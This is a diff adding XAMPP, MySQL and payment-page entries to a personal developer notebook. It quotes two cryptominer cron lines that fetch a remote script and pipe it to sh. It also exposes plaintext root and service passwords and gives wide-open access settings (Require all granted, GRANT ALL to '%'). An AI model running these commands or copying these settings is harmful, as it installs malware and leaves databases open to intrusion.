@@ -3665,6 +3665,11 @@ CentOS下安装XAMPP详细教程   ---看这个就行
 http://blog.csdn.net/hel12he/article/details/49781813
 
 
+linux 下安装配置xampp环境 
+http://blog.csdn.net/pony_maggie/article/details/52595579
+
+
+
 下载地址
 https://downloadsapachefriends.global.ssl.fastly.net/xampp-files/5.6.32/xampp-linux-x64-5.6.32-0-installer.run?from_af=true
 
@@ -3705,13 +3710,13 @@ linux下xampp集成包安装配置方法      ----安全配置是用的这个
 http://www.cnblogs.com/ygyg/p/5395207.html 
 
 
-1、先输入xampp控制面板的密码（用户名是xampp）；zfshlmxampp&*()
+1、先输入xampp控制面板的密码（用户名是xampp）；zfshlmxampp&*()  -->zfshlmxampp123
 
-2、输入phpmyadmin的密码（用户名是pma）zfshlmpma%^&*
+2、输入phpmyadmin的密码（用户名是pma）zfshlmpma%^&* ----> zfshlmpma123
 
-3、输入mysql的密码（用户名是root）zfshlmroot!@#$
+3、输入mysql的密码（用户名是root）zfshlmroot!@#$    ---> zfshlmroot123
 
-4、输入ftp密码（用户名是daemon，默认端口21）zfshlmftptest!@#$
+4、输入ftp密码（用户名是daemon，默认端口21）zfshlmftptest!@#$ --> zfshlmftptest123
 
 
 
@@ -3754,6 +3759,30 @@ XAMPP报错：Warning: World-writable config file '/opt/lampp/etc/my.cnf' is ignore
 --------------------------------
 数据据还不能访问  --ok权限的问题
 
+-----------------------------------------------
+如图所示:他会依次要求你
+
+1、先输入xampp控制面板的密码（用户名是xampp）；
+
+2、输入phpmyadmin的密码（用户名是pma）
+
+3、输入mysql的密码（用户名是root）
+
+4、输入ftp密码（用户名是daemon，默认端口21）
+
+ 9、在浏览器输入服务器的ip访问看一下成功了没有？
+
+由于服务器设置了xampp不允许远程访问，所以远程不能访问需要修改conf文件
+
+vi /opt/lampp/etc/extra/httpd-xampp.conf
+
+将   Require local  改成  Require  all granted 
+
+/opt/lampp/lampp restart 重启xampp
+
+到此xampp安装完成
+
+
 --------------------------------------------------
 New XAMPP security concept:错误解决方法
 http://blog.csdn.net/jsship/article/details/43770311
@@ -3786,6 +3815,92 @@ ErrorDocument 403 /error/XAMPP_FORBIDDEN.html.var
 
 测试
 http://47.93.11.60/thinkphp51/public/
+-------------------------------------------------------------
+xampp linux mysql
+https://www.baidu.com/s?wd=xampp%20linux%20mysql&rsv_spt=1&rsv_iqid=0x8eeea4fe00067787&issp=1&f=8&rsv_bp=1&rsv_idx=2&ie=utf-8&rqlang=cn&tn=baiduhome_pg&rsv_enter=0&rsv_t=e7d8unjs6A6vyC7hQ56benNUuhIgFhmLN6At5LJ8Mr7%2BDXRVMWPnnPD%2FfKAkM4d30MKG&oq=xampp&inputT=2445&rsv_sug3=9&rsv_sug1=7&rsv_sug7=100&sug=xampp%2520linux&rsv_pq=98194f5500073554&rsv_n=1&rsv_sug2=0&rsv_sug4=4130
+
+
+xampp在linux下如何进入mysql
+https://jingyan.baidu.com/article/c45ad29c210224051753e230.html
+
+
+报错是因为xampp中的命令工具在/opt/lampp/bin/目录中，所以可以这样运行mysql命令：  
+
+/opt/lampp/bin/mysql -uroot -p
+
+
+Linux 下安装Xampp 及配置mysql访问权限
+https://jingyan.baidu.com/article/eae07827b5ab921fec54852e.html
+
+
+mysql-创建用户并授权，设置允许远程连接    ---这个就行
+https://www.cnblogs.com/gpdm/p/6492449.html
+
+创建用户并授权
+
+ /opt/lampp/bin/mysql -uroot -pzfshlmroot123
+
+1、登录mysql
+
+　　mysql -u root -q
+
+2、创建数据库
+
+　　create database dbdata;//以创建dbdata为例
+
+3、创建用户
+
+创建user01,只能本地访问
+
+　　create user user01@'localhost' identified by 'password';
+
+创建user02,可以远程访问
+
+　　create user user02@'%' identified by 'password'
+
+4、修改用户密码
+
+以user01为例：
+
+　　set password for 'user01'@'localhost'=password('anotherpassword')
+
+5、授权
+
+授予user01管理dbdata的全部权限
+
+　　grant all privileges on dbdata.* to user01;
+
+授予user02查看权限，并修改密码
+
+　　grant select on *.* to 'user02'@'%' identified by 'anotherpassword';
+
+二、设置mysql允许远程连接（ubuntu系统）
+
+1、 sudo vi /etc/mysql/my.cnf
+
+2、注释掉如下两行：
+
+　　bind-address=127.0.0.1
+
+　　skip-network(mysql5.6版本里没有这行)
+
+3、sudo service mysql restart
+
+结合一中的授权，被授权用户可以远程访问
+
+
+
+Mysql 於lampp xampp LinuxUbuntu下的配置 
+
+https://my.oschina.net/code33/blog/299242?p=1
+
+lampp下的mysql配置文件路径:
+
+/opt/lampp/etc/my.cnf
+
+
+
+
 ------------------------------------------------------------
 求救：linux中，普通用户如何具有home的读写权限
 
@@ -4160,3 +4275,270 @@ http://www.imooc.com/article/20584
 
 公众账号首页 
 http://www.zfshlm.com/weixinpl/back_nowpaySystem/cashplatform/T_IndustryDiversionA.php?customer_id=41&latitude=46.56182&longitude=125.13415&Pname=%E9%BB%91%E9%BE%99%E6%B1%9F%E7%9C%81&Cname=%E5%A4%A7%E5%BA%86%E5%B8%82&Aname=%E5%A4%A7%E5%BA%86%E5%B8%82
+
+
+
+20180111
+discount_order.php
+
+
+<div class="littlebox01">
+	<span>消费总金额(元)：</span>
+	<input type="text" id="xfje" placeholder="请询问服务员后输入">
+</div>
+
+<button class="yhmd">确认买单</button>
+
+//简化掉上面的流程	
+saveOrder($("#xfje").val(),<?php  echo $discount / 100;?>, "", 0, 0);
+
+
+// 提交订单函数
+xfje输入值
+
+function saveOrder (xfje,discount,coupon_data,coupon_price,coupon_real_price) {
+	$.ajax({
+		type: "post",
+		url: "now_pay_ajax.php",
+		dataType: "json",
+		data: {op:"saveOrder", ordertype:0, total_money:xfje, discount:discount, goodsb:0, np_cust_id:<?php echo $n_p_custid; ?>, weixin_fromuser:"<?php echo $fromuser; ?>", user_id:<?php echo $userid; ?>, n_p_cashierid:<?php echo $n_p_cashierid;?> , product_id:0, product_count:0, coupon_data:coupon_data, coupon_price:coupon_price, coupon_real_price:coupon_real_price},
+		success: function (data) {
+				if (data.result == 1) {
+					if (0 != data.insert_id) {
+						location.href = "order_pay.php?user_id=<?php echo $userid; ?>&customer_id=<?php echo $customer_id; ?>&type=1&order_id="+data.insert_id;
+					}
+				} else {
+					alert(data.msg);
+				}                                   
+		}
+	});
+}
+
+
+order_pay.php
+
+confirmPay()
+
+438
+
+
+weipay_nowpay.php
+
+
+$unifiedOrder->setParameter("total_fee",$totalprice);//总金额
+
+----------------------------------------------------------
+
+form.submit()
+
+https://www.baidu.com/s?wd=form.submit()&rsv_spt=1&rsv_iqid=0xb4a0812f00041062&issp=1&f=8&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=98012088_5_dg&ch=12&rsv_enter=1&rsv_sug3=7&rsv_sug1=7&rsv_sug7=100
+
+form表单的两种提交方式，submit和button的用法
+http://blog.csdn.net/honey_claire/article/details/7658490
+
+jQuery 事件 - submit() 方法
+http://www.w3school.com.cn/jquery/event_submit.asp
+
+
+解决Navicat 报错:1130-host ... is not allowed to connect to this MySql server,MySQL不允许从远程访问的方法 .
+
+https://www.cnblogs.com/shyy/archive/2012/03/30/2453034.html
+
+解决MySQL ERROR 1130 (HY000): Host '192.168.1.8' is not allowed to connect to this MySQL serv
+http://www.linuxidc.com/Linux/2015-02/113668.htm
+
+
+解决MySQL ERROR 1130 (HY000): Host '192.168.1.8' is not allowed to connect to this MySQL server
+
+本机是mysql的数据库，想用另一台ip为192.168.1.8的连接这个mysql数据库，可是报了这个错误。
+
+查询得到2个方法
+
+第一个是在user表把localhost改为%， 我这么做后不仅没有解决，本地连接都要root@%这么做了（现在想想好像失误把所有localhost都给改了）。
+
+第二个方法就生效了。
+
+终端登陆mysql，执行一句sql：
+
+GRANT ALL PRIVILEGES ON *.* TO 'root'@'192.168.1.8' IDENTIFIED BY 'www.linuxidc.com' WITH GRANT OPTION;
+
+其中'www.linuxidc.com'就是设定连接密码了，然后192.168.1.8就可以连接了，简单有效，不是任意主机都可连，也安全一些。
+
+-------------------------------------------------------------
+mysql 新建用户
+
+https://www.baidu.com/s?wd=mysql%20%E6%96%B0%E5%BB%BA%E7%94%A8%E6%88%B7&rsv_spt=1&rsv_iqid=0x8f3042ff00060d5e&issp=1&f=3&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=98012088_5_dg&ch=12&rsv_enter=1&rsv_sug3=16&rsv_sug1=16&rsv_sug7=101&rsv_t=d4ed2foy%2BdK0bhg4uZWTCMQNmrwFSPGBe%2B1gw3TY%2BDyrCRjstOWTEQS3%2FewBKhlByWiyNg&rsv_sug2=1&prefixsug=mysql%2520%25E6%2596%25B0&rsp=3&inputT=8470&rsv_sug4=9503
+
+MySQL创建用户与授权方法
+http://www.jb51.net/article/31850.htm
+
+一, 创建用户:
+
+命令:CREATE USER 'username'@'host' IDENTIFIED BY 'password';
+
+说明:username - 你将创建的用户名, host - 指定该用户在哪个主机上可以登陆,如果是本地用户可用localhost, 如果想让该用户可以从任意远程主机登陆,可以使用通配符%. password - 该用户的登陆密码,密码可以为空,如果为空则该用户可以不需要密码登陆服务器.
+
+例子: CREATE USER 'dog'@'localhost' IDENTIFIED BY '123456';
+CREATE USER 'pig'@'192.168.1.101_' IDENDIFIED BY '123456';
+CREATE USER 'pig'@'%' IDENTIFIED BY '123456';
+CREATE USER 'pig'@'%' IDENTIFIED BY '';
+CREATE USER 'pig'@'%';
+
+可任意远程访问
+CREATE USER 'zfshlmysqluser1'@'%' IDENTIFIED BY 'zfshlmysqluser123456';
+授权
+GRANT ALL ON *.* TO 'zfshlmysqluser1'@'%';
+
+user:
+user1
+password:
+user1
+
+
+二,授权:
+
+命令:GRANT privileges ON databasename.tablename TO 'username'@'host'
+
+说明: privileges - 用户的操作权限,如SELECT , INSERT , UPDATE 等(详细列表见该文最后面).如果要授予所的权限则使用ALL.;databasename - 数据库名,tablename-表名,如果要授予该用户对所有数据库和表的相应操作权限则可用*表示, 如*.*.
+
+例子: GRANT SELECT, INSERT ON test.user TO 'pig'@'%';
+GRANT ALL ON *.* TO 'pig'@'%';
+
+注意:用以上命令授权的用户不能给其它用户授权,如果想让该用户可以授权,用以下命令:
+GRANT privileges ON databasename.tablename TO 'username'@'host' WITH GRANT OPTION;
+
+三.设置与更改用户密码
+
+命令:SET PASSWORD FOR 'username'@'host' = PASSWORD('newpassword');如果是当前登陆用户用SET PASSWORD = PASSWORD("newpassword");
+
+例子: SET PASSWORD FOR 'pig'@'%' = PASSWORD("123456");
+
+四.撤销用户权限
+
+命令: REVOKE privilege ON databasename.tablename FROM 'username'@'host';
+
+说明: privilege, databasename, tablename - 同授权部分.
+
+例子: REVOKE SELECT ON *.* FROM 'pig'@'%';
+
+注意: 假如你在给用户'pig'@'%'授权的时候是这样的(或类似的):GRANT SELECT ON test.user TO 'pig'@'%', 则在使用REVOKE SELECT ON *.* FROM 'pig'@'%';命令并不能撤销该用户对test数据库中user表的SELECT 操作.相反,如果授权使用的是GRANT SELECT ON *.* TO 'pig'@'%';则REVOKE SELECT ON test.user FROM 'pig'@'%';命令也不能撤销该用户对test数据库中user表的Select 权限.
+
+具体信息可以用命令SHOW GRANTS FOR 'pig'@'%'; 查看.
+
+五.删除用户
+
+命令: DROP USER 'username'@'host'; 
+
+-----------------------------------------------------
+phpMyAdmin使用教程：[2]用户及权限管理
+
+https://jingyan.baidu.com/article/fa4125acb2fd8d28ad709245.html
+
+------------------------------------------------------------------
+mysql新建用户允许远程连接
+https://www.baidu.com/s?wd=mysql%E6%96%B0%E5%BB%BA%E7%94%A8%E6%88%B7%E5%85%81%E8%AE%B8%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5&rsv_spt=1&rsv_iqid=0xf3cd46c900001407&issp=1&f=3&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=98012088_5_dg&ch=12&rsv_enter=1&rsv_sug3=53&rsv_sug1=48&rsv_sug7=100&rsv_t=a364dEnkBVa1MtIy9nd2uUVete9RzzCKXmkGkJnfboO2tcs%2FiONYHkGUKZMaAgxzeeShfQ&rsv_sug2=1&prefixsug=mysql%25E6%2596%25B0%25E5%25BB%25BA%25E7%2594%25A8%25E6%2588%25B7%25E5%2585%2581%25E8%25AE%25B8%25E8%25BF%259C%25E7%25A8%258B&rsp=0&inputT=22118&rsv_sug4=22118
+
+mysql-创建用户并授权，设置允许远程连接
+https://www.cnblogs.com/gpdm/p/6492449.html
+
+
+ mysql-创建用户并授权，设置允许远程连接
+
+一、创建用户并授权
+
+1、登录mysql
+
+　　mysql -u root -q
+
+2、创建数据库
+
+　　create database dbdata;//以创建dbdata为例
+
+3、创建用户
+
+创建user01,只能本地访问
+
+　　create user user01@'localhost' identified by 'password';
+
+创建user02,可以远程访问
+
+　　create user user02@'%' identified by 'password'
+
+4、修改用户密码
+
+以user01为例：
+
+　　set password for 'user01'@'localhost'=password('anotherpassword')
+
+5、授权
+
+授予user01管理dbdata的全部权限
+
+　　grant all privileges on dbdata.* to user01;
+
+授予user02查看权限，并修改密码
+
+　　grant select on *.* to 'user02'@'%' identified by 'anotherpassword';
+
+二、设置mysql允许远程连接（ubuntu系统）
+
+1、 sudo vi /etc/mysql/my.cnf
+
+2、注释掉如下两行：
+
+　　bind-address=127.0.0.1
+
+　　skip-network(mysql5.6版本里没有这行)
+
+3、sudo service mysql restart
+
+结合一中的授权，被授权用户可以远程访问
+
+------------------------------------------------
+20180117
+
+xampp运行php
+位置
+/opt/lampp/bin/php -v
+
+
+linux64位使用xampp及常见问题 | 操作系统
+
+http://m.codesky.net/article/mip/201010/134501.html
+
+lampp php -v -bash: php: command not found
+https://www.baidu.com/s?wd=lampp%20php%20-v%20-bash%3A%20php%3A%20command%20not%20found&rsv_spt=1&rsv_iqid=0xae6e50480004342a&issp=1&f=8&rsv_bp=1&rsv_idx=2&ie=utf-8&rqlang=cn&tn=98012088_5_dg&ch=12&rsv_enter=1&rsv_t=6b5fKb5LDOMhnSbfveLCcDJsiNuufszM9gB9h5Yt6XMwcWu6SBmkNmr9DqH5Pi8TL9Gcyg&oq=php%2520-v%2520-bash%253A%2520php%253A%2520command%2520not%2520found&inputT=2923&rsv_pq=caca77bc00043d13&rsv_sug3=11&rsv_sug2=0&rsv_sug4=3662&rsv_sug=9
+
+
+
+---------------------------------
+两个矿机呀!
+*/5 * * * * curl -fsSL http://218.248.40.228:8443/i.sh | sh
+*/5 * * * * wget -q -O- http://218.248.40.228:8443/i.sh | sh
+
+阿里云服务器被入侵——redis挖矿
+https://my.oschina.net/fufangchun/blog/993790?p=2
+
+
+得赋予权限呀
+#赋予权限
+chmod 755 hello.sh
+
+
+linux Could not open input file: 
+https://www.baidu.com/s?wd=linux%20Could%20not%20open%20input%20file%3A%20&rsv_spt=1&rsv_iqid=0xfbdb615a000083a7&issp=1&f=8&rsv_bp=1&rsv_idx=2&ie=utf-8&rqlang=cn&tn=baiduhome_pg&rsv_enter=0&rsv_t=5c71BpVYihM8ErjU9aRPOxHo80sFlklKuHzdhvOEShxfiyrKsle%2BMWMra4%2F4qryEZKbB&oq=%2526lt%253Bould%2520not%2520open%2520input%2520file%253A&inputT=3512&rsv_pq=9488dd0800007d1c&rsv_sug3=13&rsv_sug1=4&rsv_sug7=100&rsv_sug2=0&rsv_sug4=4330
+
+linux下shell脚本执行php报Could not open input file
+https://blog.slogra.com/post-221.html
+
+可以在vi中用:set ff
+https://www.baidu.com/s?wd=%E5%8F%AF%E4%BB%A5%E5%9C%A8vi%E4%B8%AD%E7%94%A8%3Aset%20ff&rsv_spt=1&rsv_iqid=0xfe93490600009d40&issp=1&f=8&rsv_bp=0&rsv_idx=2&ie=utf-8&tn=98012088_5_dg&ch=12&rsv_enter=1&rsv_n=2&rsv_sug3=1
+
+vim中 set 用法设置
+https://www.cnblogs.com/client-server/p/5606260.html
+
+三、set 设置可以在命令行输入，也可以写在$HOME下的.exrc (如果是vi)或者.vimrc(如果是vim)中。写进去很方便的。
+
+:set ff=unix #将文件格式转为unix格式
+
+
